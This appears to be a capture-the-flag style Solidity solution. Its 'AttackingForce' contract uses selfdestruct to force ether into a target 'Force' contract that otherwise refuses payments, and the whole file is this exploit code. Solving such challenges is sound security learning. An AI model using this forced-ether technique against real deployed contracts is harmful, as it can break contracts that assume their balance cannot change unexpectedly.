// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address payable public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = payable(_contractAddress);
    }

    function hackContract() external {
        selfdestruct(contractAddress);
    }
}
